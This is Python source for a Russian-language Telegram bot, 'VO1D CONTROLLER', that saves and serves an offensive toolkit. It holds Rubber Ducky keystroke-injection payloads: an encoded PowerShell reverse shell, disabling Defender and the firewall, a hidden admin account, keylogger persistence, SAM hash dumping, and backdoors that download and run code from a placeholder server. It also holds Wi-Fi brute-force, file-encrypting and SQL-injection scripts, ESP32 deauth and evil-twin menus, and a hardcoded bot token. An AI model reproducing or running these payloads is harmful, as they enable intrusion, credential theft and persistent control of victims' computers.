import os
import logging
import json
import subprocess
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
ADMIN_ID = 8632158680

DUCKY_FOLDER = "ducky_scripts"
PYTHON_FOLDER = "python_scripts"

for folder in [DUCKY_FOLDER, PYTHON_FOLDER]:
    os.makedirs(folder, exist_ok=True)

# ============================================================
# DUCKY-СКРИПТЫ (ЗАДЕРЖКА ≤500 мс)
# ============================================================
DUCKY_SCRIPTS = {
    "windows_info": {
        "desc": "Сбор информации о системе (OS, версия, пользователи, IP)",
        "code": """REM Windows Info Grabber (500ms)
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING systeminfo & ipconfig /all & net user & whoami > C:\\Windows\\Temp\\sysinfo.txt
ENTER
DELAY 300
STRING notepad C:\\Windows\\Temp\\sysinfo.txt
ENTER
"""
    },
    "grab_wifi": {
        "desc": "Экспорт всех Wi-Fi паролей в файл",
        "code": """REM Wi-Fi Passwords Grabber (500ms)
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING netsh wlan show profiles & netsh wlan export profile key=clear > C:\\Windows\\Temp\\wifi.txt
ENTER
DELAY 300
STRING notepad C:\\Windows\\Temp\\wifi.txt
ENTER
"""
    },
    "reverse_shell": {
        "desc": "Установка обратного шелла (замени IP и PORT)",
        "code": """REM Reverse Shell (500ms) - CHANGE IP:PORT
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Enc
ENTER
DELAY 300
STRING JABlAHQAIAA9ACAAJAB0AHIAeQB7ACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAiADEAMQAwAC4AMAAuADAALgAxACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHUAZgBmAGUAcgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQB9AGMAYQB0AGMAaAB7AH0A
ENTER
"""
    },
    "disable_defender": {
        "desc": "Отключение Windows Defender (реального времени, поведения, блокировки)",
        "code": """REM Disable Defender (500ms)
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true
ENTER
"""
    },
    "create_admin": {
        "desc": "Создание скрытого администратора (hacker/P@ssw0rd123)",
        "code": """REM Create Hidden Admin (500ms)
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING net user hacker P@ssw0rd123 /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add
ENTER
"""
    },
    "keylogger_install": {
        "desc": "Установка кейлоггера через стартовую папку",
        "code": """REM Keylogger Install (500ms)
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING $WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\logger.lnk"); $Shortcut.TargetPath = "powershell.exe"; $Shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\keylogger.ps1"; $Shortcut.Save()
ENTER
"""
    },
    "dump_hashes": {
        "desc": "Дамп хешей SAM/SYSTEM/SECURITY",
        "code": """REM Dump Hashes (500ms)
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING reg save HKLM\SAM C:\Windows\Temp\SAM & reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM & reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
ENTER
"""
    },
    "enable_rdp": {
        "desc": "Включение RDP и добавление в исключения фаервола",
        "code": """REM Enable RDP (500ms)
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
ENTER
"""
    },
    "install_backdoor": {
        "desc": "Установка бэкдора через планировщик задач (замени URL)",
        "code": """REM Install Backdoor (500ms)
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING schtasks /create /tn "WindowsUpdateService" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://your-server/payload.ps1')" /sc onlogon /ru SYSTEM
ENTER
"""
    },
    "persistence": {
        "desc": "Создание персистентности через реестр (Run)",
        "code": """REM Persistence via Registry (500ms)
DELAY 500
GUI r
DELAY 300
STRING reg
ENTER
DELAY 300
STRING add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
ENTER
"""
    },
    "wifi_passwords": {
        "desc": "Сохранение всех Wi-Fi сетей и паролей в файл",
        "code": """REM Wi-Fi Passwords Export (500ms)
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING netsh wlan show profiles | findstr ":" > C:\Windows\Temp\wifi.txt
ENTER
DELAY 300
STRING notepad C:\Windows\Temp\wifi.txt
ENTER
"""
    },
    "nmap_scan": {
        "desc": "Сканирование локальной сети через Nmap (если установлен)",
        "code": """REM Nmap Scan (500ms)
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING nmap -sP 192.168.1.0/24 > C:\Windows\Temp\nmap_scan.txt
ENTER
DELAY 300
STRING notepad C:\Windows\Temp\nmap_scan.txt
ENTER
"""
    },
    "disable_firewall": {
        "desc": "Отключение Windows Firewall (все профили)",
        "code": """REM Disable Firewall (500ms)
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING netsh advfirewall set allprofiles state off
ENTER
"""
    },
    "enable_winrm": {
        "desc": "Включение WinRM для удалённого управления",
        "code": """REM Enable WinRM (500ms)
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING winrm quickconfig -q & winrm set winrm/config/service/auth '@{Basic="true"}' & winrm set winrm/config/service '@{AllowUnencrypted="true"}'
ENTER
"""
    },
    "download_payload": {
        "desc": "Скачивание полезной нагрузки из интернета (замени URL)",
        "code": """REM Download Payload (500ms)
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "http://your-server/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"
ENTER
DELAY 300
STRING C:\Windows\Temp\payload.exe
ENTER
"""
    },
}

# ============================================================
# PYTHON-СКРИПТЫ (6 ШТУК)
# ============================================================
PYTHON_SCRIPTS = {
    "osint_by_email": """import requests, json, sys
def osint_email(email):
    print(f"[+] Searching {email}")
    try:
        r = requests.get(f"https://api.leakcheck.net/?key=YOUR_KEY&login={email}")
        for item in r.json().get('results', []): print(f"  [+] {item['source']}")
    except: print("[-] Error")
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python osint_by_email.py <email>"); sys.exit(1)
    osint_email(sys.argv[1])
""",
    "wifi_bruteforce": """import subprocess, sys
def bruteforce(ssid, wordlist):
    print(f"[+] Bruteforcing {ssid}")
    with open(wordlist) as f:
        for p in f:
            p = p.strip()
            r = subprocess.run(['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', p], capture_output=True)
            if 'successful' in r.stdout.decode(): print(f"[+] Found: {p}"); return
    print("[-] Not found")
if __name__ == "__main__":
    if len(sys.argv) < 3: print("Usage: python wifi_bruteforce.py <ssid> <wordlist>"); sys.exit(1)
    bruteforce(sys.argv[1], sys.argv[2])
""",
    "port_scanner": """import socket, sys
def scan(ip):
    print(f"[+] Scanning {ip}")
    open_ports = []
    for p in range(1, 1025):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
        if s.connect_ex((ip, p)) == 0: open_ports.append(p)
        s.close()
    print(f"[+] Open: {open_ports}")
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python port_scanner.py <ip>"); sys.exit(1)
    scan(sys.argv[1])
""",
    "file_encryptor": """import os, sys; from cryptography.fernet import Fernet
def encrypt(f):
    with open(f, 'rb') as x: data = x.read()
    key = Fernet.generate_key(); c = Fernet(key)
    with open(f + '.encrypted', 'wb') as x: x.write(c.encrypt(data))
    os.remove(f); print(f"[+] Encrypted: {f}\\n[+] Key: {key.decode()}")
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python file_encryptor.py <file>"); sys.exit(1)
    encrypt(sys.argv[1])
""",
    "sql_injection_scanner": """import requests, sys
def test(url, param):
    payloads = ["' OR '1'='1", "' UNION SELECT NULL--"]
    for p in payloads:
        r = requests.get(url, params={param: p})
        if "error" not in r.text.lower() and "mysql" not in r.text.lower():
            print(f"[+] Vuln: {url}?{param}={p}"); return
    print("[-] No SQLi")
if __name__ == "__main__":
    if len(sys.argv) < 3: print("Usage: python sql_injection_scanner.py <url> <param>"); sys.exit(1)
    test(sys.argv[1], sys.argv[2])
""",
    "subdomain_finder": """import requests, sys
def find(domain):
    subs = ['www','mail','admin','dev','test','api','ftp','ssh','vpn','backup','blog']
    for s in subs:
        try:
            r = requests.get(f"https://{s}.{domain}", timeout=2)
            if r.status_code == 200: print(f"[+] Found: {s}.{domain}")
        except: pass
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python subdomain_finder.py <domain>"); sys.exit(1)
    find(sys.argv[1])
""",
}

# ============================================================
# СОХРАНЕНИЕ
# ============================================================
def save_scripts():
    for name, data in DUCKY_SCRIPTS.items():
        with open(os.path.join(DUCKY_FOLDER, f"{name}.duck"), 'w') as f:
            f.write(data['code'])
    for name, code in PYTHON_SCRIPTS.items():
        with open(os.path.join(PYTHON_FOLDER, f"{name}.py"), 'w') as f:
            f.write(code)
save_scripts()

# ============================================================
# ТЕЛЕГРАМ-БОТ
# ============================================================
logging.basicConfig(level=logging.INFO)

async def start(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("🦆 Ducky Scripts", callback_data="ducky_menu")],
        [InlineKeyboardButton("🐍 Python Scripts", callback_data="python_menu")],
        [InlineKeyboardButton("📡 ESP32 Control", callback_data="esp32_menu")],
        [InlineKeyboardButton("ℹ️ О коде", callback_data="about")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
    ]
    await update.message.reply_text("🔥 **VO1D CONTROLLER**\nВыбери раздел:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def ducky_menu(update: Update, context):
    query = update.callback_query; await query.answer()
    keyboard = [[InlineKeyboardButton(f"🦆 {name}", callback_data=f"ducky_{name}")] for name in DUCKY_SCRIPTS]
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_main")])
    await query.edit_message_text("🦆 **Ducky Scripts**\nВыбери скрипт (задержка ≤500ms):", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def python_menu(update: Update, context):
    query = update.callback_query; await query.answer()
    keyboard = [[InlineKeyboardButton(f"🐍 {name}", callback_data=f"python_{name}")] for name in PYTHON_SCRIPTS]
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_main")])
    await query.edit_message_text("🐍 **Python Scripts**\nВыбери скрипт:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def esp32_menu(update: Update, context):
    query = update.callback_query; await query.answer()
    keyboard = [
        [InlineKeyboardButton("📡 Scan Wi-Fi", callback_data="esp_scan")],
        [InlineKeyboardButton("🔴 Deauth Attack", callback_data="esp_deauth")],
        [InlineKeyboardButton("🎯 Evil Twin AP", callback_data="esp_evil")],
        [InlineKeyboardButton("📡 BLE Scan", callback_data="esp_ble")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_main")],
    ]
    await query.edit_message_text("📡 **ESP32 Control**\nУправление атаками:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def show_ducky(update: Update, context):
    query = update.callback_query; await query.answer()
    name = query.data.replace("ducky_", "")
    data = DUCKY_SCRIPTS.get(name)
    if data:
        await query.edit_message_text(
            f"🦆 **{name}**\n\n📝 {data['desc']}\n\n```\n{data['code'][:600]}\n```\n\nСкопируй в DuckyScript.",
            parse_mode="Markdown"
        )

async def show_python(update: Update, context):
    query = update.callback_query; await query.answer()
    name = query.data.replace("python_", "")
    code = PYTHON_SCRIPTS.get(name)
    if code:
        await query.edit_message_text(
            f"🐍 **{name}**\n\n```python\n{code[:600]}\n```\n\nЗапусти: `python {name}.py`",
            parse_mode="Markdown"
        )

async def esp_command(update: Update, context):
    query = update.callback_query; await query.answer()
    cmd = query.data
    messages = {
        "esp_scan": "📡 **Scan Wi-Fi**\nОтправь на ESP32: `/scan`",
        "esp_deauth": "🔴 **Deauth Attack**\nВыбери цель в веб-интерфейсе ESP32",
        "esp_evil": "🎯 **Evil Twin AP**\nЗапусти фейковую точку доступа",
        "esp_ble": "📡 **BLE Scan**\nСканирование Bluetooth устройств",
    }
    await query.edit_message_text(messages.get(cmd, "Команда отправлена"), parse_mode="Markdown")

async def about(update: Update, context):
    query = update.callback_query; await query.answer()
    await query.edit_message_text(
        "ℹ️ **О коде**\n\n"
        "🦆 **Ducky Scripts** — 15+ скриптов с задержкой ≤500 мс\n"
        "🐍 **Python Scripts** — OSINT, брутфорс, сканер, шифрование, SQLi, сабдомены\n"
        "📡 **ESP32** — управление Wi-Fi атаками\n\n"
        "⚡ Все скрипты оптимизированы для максимальной скорости.\n"
        "🔒 Бот работает локально, логи не хранит.",
        parse_mode="Markdown"
    )

async def status(update: Update, context):
    query = update.callback_query; await query.answer()
    await query.edit_message_text(
        "📊 **Status**\n\n"
        f"🦆 Ducky scripts: {len(DUCKY_SCRIPTS)}\n"
        f"🐍 Python scripts: {len(PYTHON_SCRIPTS)}\n"
        f"📡 ESP32: готов\n"
        f"⏱️ Время работы: {time.strftime('%H:%M:%S')}",
        parse_mode="Markdown"
    )

async def back_main(update: Update, context):
    query = update.callback_query; await query.answer()
    keyboard = [
        [InlineKeyboardButton("🦆 Ducky Scripts", callback_data="ducky_menu")],
        [InlineKeyboardButton("🐍 Python Scripts", callback_data="python_menu")],
        [InlineKeyboardButton("📡 ESP32 Control", callback_data="esp32_menu")],
        [InlineKeyboardButton("ℹ️ О коде", callback_data="about")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
    ]
    await query.edit_message_text("🔥 **VO1D CONTROLLER**\nВыбери раздел:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(ducky_menu, pattern="^ducky_menu$"))
    app.add_handler(CallbackQueryHandler(python_menu, pattern="^python_menu$"))
    app.add_handler(CallbackQueryHandler(esp32_menu, pattern="^esp32_menu$"))
    app.add_handler(CallbackQueryHandler(show_ducky, pattern="^ducky_"))
    app.add_handler(CallbackQueryHandler(show_python, pattern="^python_"))
    app.add_handler(CallbackQueryHandler(esp_command, pattern="^esp_"))
    app.add_handler(CallbackQueryHandler(about, pattern="^about$"))
    app.add_handler(CallbackQueryHandler(status, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(back_main, pattern="^back_main$"))
    print("🚀 Бот запущен")
    app.run_polling()

if __name__ == "__main__":
    main()